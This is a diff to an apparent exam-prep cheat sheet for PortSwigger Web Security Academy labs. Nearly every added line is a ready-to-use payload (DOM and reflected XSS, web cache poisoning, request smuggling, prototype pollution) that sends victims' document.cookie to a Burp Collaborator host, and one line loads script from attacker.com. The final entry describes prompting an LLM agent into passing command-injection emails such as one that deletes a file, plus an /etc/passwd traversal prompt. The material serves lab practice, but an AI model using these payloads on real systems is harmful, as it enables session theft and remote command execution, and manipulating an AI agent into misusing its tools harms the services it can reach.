@@ -84,6 +84,7 @@ Categories typically used to gain initial access: against an anonymous/generic v
 - Signal: as above, but the sink isn't a direct `eval`: the message value is used to set a URL (e.g. the `location` of a link) that accepts the `javascript:` scheme.
 - Solution: instead of direct JS code, send as the message data a `javascript:` string that executes the payload when the URL is activated.
 - Payload: `postMessage('javascript:alert(document.domain)','*')`
+- Exam payload (Burp Collaborator): `postMessage('javascript:document.location="https://YOUR-SUBDOMAIN.burpcollaborator.net/?c="+document.cookie','*')`
 - Link: [DOM XSS using web messages and a JavaScript URL](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url)
 - Step: 1
 
@@ -110,6 +111,7 @@ Categories typically used to gain initial access: against an anonymous/generic v
 - Signal: a controllable source is written into `document.cookie` without sanitization (e.g. `document.cookie = 'name=' + location.hash.slice(1)`), and that cookie is then reflected elsewhere on the page without HTML encoding.
 - Solution: use the URL fragment to set a cookie value that itself contains an XSS payload, exploiting the fact that the cookie is reflected without encoding.
 - Payload: `https://TARGET/page#<img src=1 onerror=alert(document.domain)>` (the value after `#` ends up in the cookie and is then reflected and executed)
+- Exam payload (Burp Collaborator): `https://TARGET/page#<img src=1 onerror=document.location='https://YOUR-SUBDOMAIN.burpcollaborator.net/?c='+document.cookie>` (the value after `#` ends up in the cookie and is then reflected and executed)
 - Link: [DOM-based cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation)
 - Step: 1
 
@@ -127,6 +129,7 @@ The sink isn't in the HTTP response but in client-side JavaScript: you need to f
 - Signal: `location.search` ends up in a `document.write()` used to populate the options of a `<select>`; inside a `<select>` tag, HTML tags aren't interpreted normally.
 - Solution: first close the `</select>` tag (and any other containing tag) to escape the non-executable context, then inject the markup.
 - Payload: `</select><img src=1 onerror=alert(document.domain)>`
+- Exam payload (Burp Collaborator): `</select><img src=1 onerror=document.location='https://YOUR-SUBDOMAIN.burpcollaborator.net/?c='+document.cookie>`
 - Link: [DOM XSS in document.write sink using source location.search inside a select element](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element)
 - Step: 1
 
@@ -135,6 +138,7 @@ The sink isn't in the HTTP response but in client-side JavaScript: you need to f
 - Signal: the page uses `ng-app`/AngularJS and your input ends up in a context where angle brackets and `"` are encoded, but double curly braces are not.
 - Solution: exploit AngularJS's sandbox (no CSP) to execute a `{{...}}` expression that calls the function constructor.
 - Payload: `{{$on.constructor('alert(1)')()}}`
+- Exam payload (Burp Collaborator): `{{$on.constructor('document.location="https://YOUR-SUBDOMAIN.burpcollaborator.net/?c="+document.cookie')()}}`
 - Link: [DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression)
 - Step: 1
 
@@ -143,6 +147,7 @@ The sink isn't in the HTTP response but in client-side JavaScript: you need to f
 - Signal: the server reflects a value inside a script, e.g. `eval('var data = "..."')`, where the value reflected by the server (not the browser) is then executed via `eval`.
 - Solution: break out of the string passed to `eval` and inject your own code, keeping in mind that here the round-trip goes through the server (so server-side encoding matters).
 - Payload: `\'-alert(document.domain)-\'` (or variants depending on the encoding applied by the server)
+- Exam payload (Burp Collaborator): `\'-document.location="https://YOUR-SUBDOMAIN.burpcollaborator.net/?c="+document.cookie-\'` (or variants depending on the encoding applied by the server)
 - Link: [Reflected DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected)
 - Step: 1
 
@@ -151,6 +156,7 @@ The sink isn't in the HTTP response but in client-side JavaScript: you need to f
 - Signal: a saved value (e.g. a comment) is written client-side with `element.innerHTML = comment.author` instead of being inserted as safe text.
 - Solution: set your own name/comment to an HTML payload that exploits `innerHTML`.
 - Payload: `<img src=1 onerror=alert(document.domain)>` in the saved field (e.g. username)
+- Exam payload (Burp Collaborator): `<img src=1 onerror=document.location='https://YOUR-SUBDOMAIN.burpcollaborator.net/?c='+document.cookie>` in the saved field (e.g. username)
 - Link: [Stored DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored)
 - Step: 1
 
@@ -169,6 +175,7 @@ The sink isn't in the HTTP response but in client-side JavaScript: you need to f
 - Signal: only standard HTML tags are blocked; tags with an arbitrary name (custom elements) pass the filter.
 - Solution: use a made-up tag with `onfocus` and `autofocus`/`tabindex` to execute JS without user interaction.
 - Payload: `<xss id=x onfocus=alert(document.domain) tabindex=1></xss>#x` (the hash forces focus onto the element)
+- Exam payload (Burp Collaborator): `<xss id=x onfocus=document.location='https://YOUR-SUBDOMAIN.burpcollaborator.net/?c='+document.cookie tabindex=1></xss>#x` (the hash forces focus onto the element)
 - Link: [Reflected XSS into HTML context with all tags blocked except custom ones](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked)
 - Step: 1
 
@@ -177,6 +184,7 @@ The sink isn't in the HTTP response but in client-side JavaScript: you need to f
 - Signal: normal HTML tags are blocked but `<svg>` and SVG tags pass.
 - Solution: use an SVG element with a self-triggering event, e.g. `animatetransform` with `onbegin`.
 - Payload: `<svg><animatetransform onbegin=alert(document.domain) attributeName=transform>`
+- Exam payload (Burp Collaborator): `<svg><animatetransform onbegin=document.location='https://YOUR-SUBDOMAIN.burpcollaborator.net/?c='+document.cookie attributeName=transform>`
 - Link: [Reflected XSS with some SVG markup allowed](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed)
 - Step: 1
 
@@ -185,6 +193,7 @@ The sink isn't in the HTTP response but in client-side JavaScript: you need to f
 - Signal: the input ends up inside the `href` attribute of a `<link rel="canonical">` tag; angle brackets are encoded but you can close the attribute and add others.
 - Solution: close `href`, add `accesskey` + `onclick` (the `<link>` tag doesn't generate automatic events, so interaction via a keyboard shortcut is needed) and induce the victim to press the key combination.
 - Payload: ` " accesskey="x" onclick="alert(document.domain)"  ` (then a delivery that gets the victim to press Alt+Shift+X / Ctrl+Alt+X depending on the system)
+- Exam payload (Burp Collaborator): ` " accesskey="x" onclick="document.location='https://YOUR-SUBDOMAIN.burpcollaborator.net/?c='+document.cookie"  ` (then a delivery that gets the victim to press Alt+Shift+X / Ctrl+Alt+X depending on the system)
 - Link: [Reflected XSS in canonical link tag](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag)
 - Step: 1
 
@@ -195,6 +204,7 @@ The sink isn't in the HTTP response but in client-side JavaScript: you need to f
 - Signal: the value ends up in a JS string between single quotes; the app escapes `'` and `\` but doesn't close the `<script>` tag.
 - Solution: directly close the script tag and open a new one, bypassing the string escaping.
 - Payload: `</script><img src=1 onerror=alert(document.domain)>`
+- Exam payload (Burp Collaborator): `</script><img src=1 onerror=document.location='https://YOUR-SUBDOMAIN.burpcollaborator.net/?c='+document.cookie>`
 - Link: [Reflected XSS into a JavaScript string with single quote and backslash escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped)
 - Step: 1
 
@@ -203,6 +213,7 @@ The sink isn't in the HTTP response but in client-side JavaScript: you need to f
 - Signal: the app puts a backslash before every single quote, but doesn't double (escape) backslashes that you insert.
 - Solution: send an extra backslash before your quote, so the app's backslash "neutralizes" yours and your quote goes back to closing the string.
 - Payload: `\';alert(document.domain)//` (becomes `\\';alert(document.domain)//` after the app's escaping)
+- Exam payload (Burp Collaborator): `\';document.location='https://YOUR-SUBDOMAIN.burpcollaborator.net/?c='+document.cookie//` (becomes `\\';alert(document.domain)//` after the app's escaping)
 - Link: [Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped)
 - Step: 1
 
@@ -211,6 +222,7 @@ The sink isn't in the HTTP response but in client-side JavaScript: you need to f
 - Signal: the payload ends up inside the `onclick` attribute, the server HTML-decodes the attribute before the JS is interpreted.
 - Solution: use the HTML entity `&apos;` instead of the quote: the browser decodes it into `'` only after HTML parsing, bypassing server-side filters on the literal quote.
 - Payload: `&apos;-alert(document.domain)-&apos;`
+- Exam payload (Burp Collaborator): `&apos;-document.location="https://YOUR-SUBDOMAIN.burpcollaborator.net/?c="+document.cookie-&apos;`
 - Link: [Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped)
 - Step: 1
 
@@ -219,6 +231,7 @@ The sink isn't in the HTTP response but in client-side JavaScript: you need to f
 - Signal: the value ends up inside a template literal (backtick) used with `${...}`; nothing needs to be closed.
 - Solution: directly use the template literal's `${...}` syntax to execute code.
 - Payload: `${alert(document.domain)}`
+- Exam payload (Burp Collaborator): `${document.location='https://YOUR-SUBDOMAIN.burpcollaborator.net/?c='+document.cookie}`
 - Link: [Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped)
 - Step: 1
 
@@ -270,6 +283,7 @@ The sink isn't in the HTTP response but in client-side JavaScript: you need to f
 - Signal: a header like `X-Forwarded-Host` is reflected in dynamic URLs in the response (e.g. Open Graph image, script import) and isn't part of the cache key.
 - Solution: send an XSS/malicious URL payload in the unkeyed header with a cache buster in the query, verify that it's reflected and cached, then redo the clean request (without the malicious header, same cache buster) to confirm that the poisoned version is served.
 - Payload: `GET /?cb=123 HTTP/1.1` with `X-Forwarded-Host: a."><script>alert(1)</script>`
+- Exam payload (Burp Collaborator): `GET /?cb=123 HTTP/1.1` with `X-Forwarded-Host: a."><script>document.location='https://YOUR-SUBDOMAIN.burpcollaborator.net/?c='+document.cookie</script>`
 - Link: [Web cache poisoning with an unkeyed header](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header)
 - Step: 1
 
@@ -278,6 +292,7 @@ The sink isn't in the HTTP response but in client-side JavaScript: you need to f
 - Signal: a cookie (e.g. preferred language) determines the content of the response but isn't part of the cache key.
 - Solution: set a payload in the cookie value and get the resulting response cached; anyone visiting the same URL will receive the poisoned version.
 - Payload: a request with `Cookie: language=<script>alert(1)</script>` and a cache buster in the query
+- Exam payload (Burp Collaborator): a request with `Cookie: language=<script>document.location='https://YOUR-SUBDOMAIN.burpcollaborator.net/?c='+document.cookie</script>` and a cache buster in the query
 - Link: [Web cache poisoning with an unkeyed cookie](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-cookie)
 - Step: 1
 
@@ -304,6 +319,7 @@ The sink isn't in the HTTP response but in client-side JavaScript: you need to f
 - Signal: the cache completely ignores the query string; a reflected XSS via a parameter seems "not to work" because you always get the same cached response.
 - Solution: use a cache buster in a keyed header (e.g. `Cookie: cb=1`) to bypass the cache and confirm the XSS, then send the request with the payload in the parameter (without a cache buster) to poison the response everyone will receive visiting the clean URL.
 - Payload: `GET /?param=<script>alert(1)</script>` (without a query string the request is still equivalent for the cache)
+- Exam payload (Burp Collaborator): `GET /?param=<script>document.location='https://YOUR-SUBDOMAIN.burpcollaborator.net/?c='+document.cookie</script>` (without a query string the request is still equivalent for the cache)
 - Link: [Web cache poisoning via an unkeyed query string](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-query)
 - Step: 1
 
@@ -312,6 +328,7 @@ The sink isn't in the HTTP response but in client-side JavaScript: you need to f
 - Signal: not the entire query string is excluded from the cache key, only specific parameters (typically analytics/marketing ones, e.g. `utm_content`); the rest of the query remains keyed.
 - Solution: check whether that excluded parameter is still passed to an exploitable gadget (e.g. reflected without encoding), and use it to inject the payload while keeping the cache key unchanged.
 - Payload: `GET /?tracking=123&utm_content=<script>alert(1)</script>`
+- Exam payload (Burp Collaborator): `GET /?tracking=123&utm_content=<script>document.location='https://YOUR-SUBDOMAIN.burpcollaborator.net/?c='+document.cookie</script>`
 - Link: [Web cache poisoning via an unkeyed query parameter](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-param)
 - Step: 1
 
@@ -328,6 +345,7 @@ The sink isn't in the HTTP response but in client-side JavaScript: you need to f
 - Signal: the cache key is based only on the request line (method+URL), but the server also reads a body even on GET requests.
 - Solution: send a GET with a body containing the malicious parameter; the cache key stays "clean" (based on the URL) but the server uses the value from the body.
 - Payload: `GET /?param=innocent HTTP/1.1` with body `param=<script>alert(1)</script>`
+- Exam payload (Burp Collaborator): `GET /?param=innocent HTTP/1.1` with body `param=<script>document.location='https://YOUR-SUBDOMAIN.burpcollaborator.net/?c='+document.cookie</script>`
 - Link: [Web cache poisoning via a fat GET request](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)
 - Step: 1
 
@@ -336,6 +354,7 @@ The sink isn't in the HTTP response but in client-side JavaScript: you need to f
 - Signal: a reflected XSS in a parameter seems "unexploitable" because the victim's browser automatically URL-encodes dangerous characters in the request it would send; but the cache normalizes (decodes) the input when building the cache key.
 - Solution: poison the cache by sending the request with the unencoded XSS payload YOURSELF (via Burp Repeater, without going through the browser); the normalized cache key will match the one for the URL-encoded request the victim would send by visiting the link, so she receives the already-executable poisoned response.
 - Payload: `GET /example?param="><script>alert(1)</script>` sent directly (not URL-encoded) to poison the cache key shared with `GET /example?param=%22%3e%3cscript%3e...`
+- Exam payload (Burp Collaborator): `GET /example?param="><script>document.location='https://YOUR-SUBDOMAIN.burpcollaborator.net/?c='+document.cookie</script>` sent directly (not URL-encoded) to poison the cache key shared with `GET /example?param=%22%3e%3cscript%3e...`
 - Link: [URL normalization](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-normalization)
 - Step: 1
 
@@ -464,6 +483,7 @@ The sink isn't in the HTTP response but in client-side JavaScript: you need to f
 - Signal: there's a reflected XSS in a header (e.g. `User-Agent`) hard to exploit normally because the attacker doesn't easily control other users' request headers.
 - Solution: smuggle a request with the XSS payload in the vulnerable header; the next request from another victim will be appended and processed as if it contained that header, hitting the victim without requiring any click.
 - Payload: smuggle `GET / HTTP/1.1\r\nHost: VULN\r\nContent-Length: 63\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET / HTTP/1.1\r\nUser-Agent: <script>alert(1)</script>\r\nFoo: X`
+- Exam payload (Burp Collaborator): smuggle `GET / HTTP/1.1\r\nHost: VULN\r\nContent-Length: 63\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET / HTTP/1.1\r\nUser-Agent: <script>document.location='https://YOUR-SUBDOMAIN.burpcollaborator.net/?c='+document.cookie</script>\r\nFoo: X`
 - Link: [Exploiting HTTP request smuggling to deliver reflected XSS](https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss)
 - Step: 1
 
@@ -887,6 +907,7 @@ When the input passes through a parser (e.g. XML) or is filtered by a WAF: obfus
 - Signal: a URL parameter lets you inject `__proto__[prop]=value`; the page uses a library/code that reads a property not explicitly defined and passes it to a DOM sink (e.g. `innerHTML`).
 - Solution: use DOM Invader (or test manually in the console) to find the source and the gadget, then build a URL that pollutes the prototype with an XSS payload in the property used by the gadget.
 - Payload: `?__proto__[transport_url]=data:,alert(1)//` or `?__proto__[sourceUrl]=//attacker.com/evil.js`
+- Exam payload (Burp Collaborator): `?__proto__[transport_url]=data:,document.location='https://YOUR-SUBDOMAIN.burpcollaborator.net/?c='+document.cookie//` or `?__proto__[sourceUrl]=//attacker.com/evil.js`
 - Link: [DOM XSS via client-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-client-side-prototype-pollution)
 
 **2. DOM XSS via an alternative prototype pollution vector**
@@ -894,6 +915,7 @@ When the input passes through a parser (e.g. XML) or is filtered by a WAF: obfus
 - Signal: the classic query-string source doesn't work, but another vector exists (e.g. the URL fragment/hash, or dot notation instead of square brackets).
 - Solution: try variants of the injection vector (`__proto__.prop=val` instead of `__proto__[prop]=val`, or inject into the fragment `#__proto__[prop]=val`).
 - Payload: `#__proto__[transport_url]=data:,alert(1)//`
+- Exam payload (Burp Collaborator): `#__proto__[transport_url]=data:,document.location='https://YOUR-SUBDOMAIN.burpcollaborator.net/?c='+document.cookie//`
 - Link: [DOM XSS via an alternative prototype pollution vector](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-an-alternative-prototype-pollution-vector)
 
 **3. Client-side prototype pollution via flawed sanitization (bypass)**
@@ -915,6 +937,7 @@ When the input passes through a parser (e.g. XML) or is filtered by a WAF: obfus
 - Signal: the developers protected a property with `Object.defineProperty(obj, 'gadget', {configurable:false, writable:false})` without setting an initial value; or the gadget sits in an undefined option passed to `fetch()` (e.g. `headers`).
 - Solution: pollute the prototype with a `value` property that will be inherited by the descriptor object passed to `Object.defineProperty()`, bypassing the "protection"; or pollute `headers` in `fetch()`'s options to inject data that then ends up in a DOM sink.
 - Payload: `?__proto__[headers][x-username]=<img/src/onerror=alert(1)>` (for the fetch case) or `?__proto__[value]=payload` (for the defineProperty bypass)
+- Exam payload (Burp Collaborator): `?__proto__[headers][x-username]=<img/src/onerror=document.location='https://YOUR-SUBDOMAIN.burpcollaborator.net/?c='+document.cookie>` (for the fetch case) or `?__proto__[value]=payload` (for the defineProperty bypass)
 - Link: [Client-side prototype pollution via browser APIs](https://portswigger.net/web-security/prototype-pollution/client-side/browser-apis/lab-prototype-pollution-client-side-prototype-pollution-via-browser-apis)
 
 ### B. Server-side prototype pollution (Node.js)
@@ -1227,9 +1250,9 @@ When the input passes through a parser (e.g. XML) or is filtered by a WAF: obfus
 
 **1. Exploiting vulnerabilities in LLM APIs (chained vulnerability)**
 
-- Signal: the LLM has access to APIs that seem innocuous (e.g. a function accepting a filename), but those APIs might have classic web vulnerabilities (path traversal, SQLi) exploitable through the LLM.
-- Solution: map the APIs accessible to the LLM by asking it directly which functions it can call, then convince it (via prompting) to send a classic attack payload (e.g. a traversal sequence) as an argument to one of those functions.
-- Payload: a prompt to the LLM such as "Use the file-reading function to read `../../../etc/passwd`" or similar, exploiting a function with path traversal
+- Signal: the LLM has access to APIs that seem innocuous (e.g. the newsletter subscription API, which takes an email address), but those APIs might have classic web vulnerabilities (OS command injection, SQLi, path traversal) exploitable through the LLM.
+- Solution: map the APIs accessible to the LLM by asking it directly which functions it can call, confirm it actually invokes the one you're targeting, then convince it (via prompting) to pass it an email argument containing a shell command wrapped in `$(...)` placed before the `@` and your exploit-server domain; the backend runs it as part of handling the subscription.
+- Payload: ask the LLM to subscribe the email `$(whoami)@YOUR-EXPLOIT-SERVER-ID.exploit-server.net` to confirm command execution, then `$(rm /home/carlos/morale.txt)@YOUR-EXPLOIT-SERVER-ID.exploit-server.net` to delete Carlos' file
 - Link: [Exploiting vulnerabilities in LLM APIs](https://portswigger.net/web-security/llm-attacks/lab-exploiting-vulnerabilities-in-llm-apis)
 - Step: 3
 
